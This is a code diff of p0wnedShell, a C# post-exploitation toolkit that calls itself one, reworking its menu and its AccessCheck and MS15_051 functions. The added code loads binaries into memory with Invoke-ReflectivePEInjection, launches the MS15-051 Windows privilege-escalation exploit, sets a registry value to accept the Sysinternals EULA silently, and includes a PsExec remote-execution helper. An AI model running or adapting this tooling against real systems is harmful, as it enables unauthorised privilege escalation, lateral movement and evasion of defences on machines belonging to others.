@@ -45,6 +45,7 @@ using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.DirectoryServices.ActiveDirectory;
+using Microsoft.Win32;
 
 //Add For PowerShell Invocation
 using System.Collections.ObjectModel;
@@ -174,7 +175,7 @@ namespace p0wnedShell
             Console.WriteLine();
             return password;
         }
-        
+
         public static int DisplayMenu()
         {
             string[] toPrint = { "* PowerShell Runspace Post Exploitation Toolkit                     *",
@@ -188,7 +189,7 @@ namespace p0wnedShell
             Console.WriteLine();
             Console.WriteLine(" 2. Scan for IP-Addresses, HostNames and open Ports in your Network.");
             Console.WriteLine();
-            Console.WriteLine(" 3. User Sysinternals accesschk to ennumerate accessible objects, i.e. writable directories");
+            Console.WriteLine(" 3. Use Sysinternals AccessChk to ennumerate accessible objects, i.e. writable directories");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Code Execution:\n");
@@ -1257,6 +1258,94 @@ namespace p0wnedShell
             }
         }
 
+        public static void AccessCheck()
+        {
+            //accept sysinternals eula
+            const string userRoot = "HKEY_CURRENT_USER";
+            const string subkey = "SOFTWARE\\Sysinternals\\AccessChk";
+            const string keyName = userRoot + "\\" + subkey;
+            Registry.SetValue(keyName, "EulaAccepted", 1, RegistryValueKind.DWord);
+
+            string[] toPrint = { "* Run Sysinternals AccessChk to determine accessible objects.     *" };
+            Program.PrintBanner(toPrint);
+
+            Console.WriteLine("[+] You can use your own command line arguments, or accept defaults (Check OS Drive with BUILTIN\\Users)");
+            Console.Write("[+] Accept default arguments? (y/n) > ");
+
+            string input = Console.ReadLine();
+            string commandline = "";
+            switch (input.ToLower())
+            {
+                case "y":
+                    string path = Path.GetPathRoot(Environment.SystemDirectory);
+                    commandline = @"BUILTIN\Users -qswu " + path + "";
+                    Console.WriteLine();
+                    break;
+                case "n":
+                    Console.Write("\n[+] Please enter the command line arguments you want to execute > ");
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    commandline = Console.ReadLine().TrimEnd('\r', '\n');
+                    Console.ResetColor();
+                    Console.WriteLine();
+                    break;
+                default:
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
+                    Console.ResetColor();
+                    Console.WriteLine("Press Enter to Continue...");
+                    Console.ReadLine();
+                    return;
+            }
+
+
+            //Console.WriteLine("\n[+] Enter the pid of the process you want to attach accesscheck to, press enter for default  >");
+            //var spid = Console.ReadLine();
+            string AccessChk = "";
+
+            //try
+            //{
+            //    int pid = Convert.ToInt32(spid);
+            //    AccessChk = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.AccessChk() + "\" -split ' ') -ExeArgs \"" + commandline + "\" -procid " + pid + " -Verbose";
+            //}
+            //catch
+            //{
+                AccessChk = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.AccessChk() + "\" -split ' ') -ExeArgs \"" + commandline + "\" -Verbose";
+            //}
+
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("[+] Commandline: \"accesschk.exe " + commandline + "\"");
+            Console.ResetColor();
+            Console.WriteLine("[+] Press Enter to start...");
+            Console.ReadLine();
+
+            try
+            {
+                P0wnedListener.Execute(AccessChk);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+
+            Console.WriteLine("[+] Press Enter to continue...");
+            Console.ReadLine();
+        }
+
+        public static void MS15_051()
+        {
+            Console.Write("[+] Press enter to execute MS15-051 > ");
+            string input = Console.ReadLine();
+            string MS15_051 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.ms15_051() + "\" -split ' ') -Verbose";
+            try
+            {
+                P0wnedListener.Execute(MS15_051);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
         public static void PsExecShell(string Hostname)
         {
             string TestConnection = "Invoke-PsExec -ComputerName " + Hostname + " -Command \"whoami\" -ResultFile \"" + Program.P0wnedPath() + "\\Result.txt\"";
@@ -1321,71 +1410,6 @@ namespace p0wnedShell
             }
         }
 
-        public static void AccessCheck()
-        {
-            string[] toPrint = { "* Run sysinternals accesschk to determin writable directories.       *" };
-            Program.PrintBanner(toPrint);
-
-            Console.Write("[+] You can build your own command line, or you can let the default run (osdrive checkup with BUILTIN\\Users) > ");
-            Console.WriteLine("\n[+] Want to build your own command line? (y/n) >");
-            string input = Console.ReadLine();
-            string commandline = "";
-            switch (input.ToLower())
-            {
-                case "y":
-                    Console.Write("\n[+] Please enter the commandline you want to execute > ");
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    commandline = Console.ReadLine().TrimEnd('\r', '\n');
-                    Console.ResetColor();
-                    break;
-                case "n":
-                    string path = Path.GetPathRoot(Environment.SystemDirectory);
-                    commandline = @"BUILTIN\Users -qswu " + path + " /accepteula";
-                    break;
-                default:
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
-                    Console.ResetColor();
-                    Console.WriteLine("Press Enter to start over...");
-                    Console.ReadLine();
-                    AccessCheck();
-                    return;
-            }
-
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("[+] Commandline: \"accesschk.exe " + commandline + "\"");
-            Console.ResetColor();
-            Console.WriteLine("[+] Press Enter to Start...");
-            Console.ReadLine();
-
-            string AccessChk = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.AccessChk() + "\" -split ' ') -ExeArgs \"" + commandline + "\" -Verbose";
-            try
-            {
-                P0wnedListener.Execute(AccessChk);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-
-            Console.WriteLine("[+] Press any key to continue...");
-            Console.ReadLine();
-        }
-
-        public static void MS15_051()
-        {
-            Console.Write("[+] Press enter to execute MS15-051 > ");
-            string input = Console.ReadLine();
-            string MS15_051 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.ms15_051() + "\" -split ' ') -Verbose";
-            try
-            {
-                P0wnedListener.Execute(MS15_051);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-        }
 
         //Based on Jared Atkinson's And Justin Warner's Work
         public static string RunPSCommand(string cmd)
